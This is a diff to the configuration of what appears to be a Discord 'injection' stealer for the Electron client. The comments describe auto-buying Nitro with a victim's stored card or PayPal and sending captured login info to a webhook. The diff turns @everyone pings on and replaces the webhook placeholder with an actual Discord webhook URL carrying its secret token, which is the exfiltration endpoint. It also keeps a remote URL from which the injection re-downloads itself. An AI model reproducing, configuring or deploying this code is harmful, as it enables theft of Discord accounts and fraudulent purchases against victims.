@@ -6,7 +6,7 @@ const { BrowserWindow, session } = require("electron");
 
 const config = {
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
+  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: "Discord Injection", //name of the webhook thats gonna send the info
   embed_icon:
@@ -15,7 +15,7 @@ const config = {
       "%20",
     ), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "%WEBHOOK%", //your discord webhook there obviously
+  webhook: "https://discord.com/api/webhooks/966689527236292670/zM5AnLTWdyXgASzRuEBZmApggP_iFyD9OLwwhuFWb4L5650_Bu2BasTPuLU6eY7VbY63", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
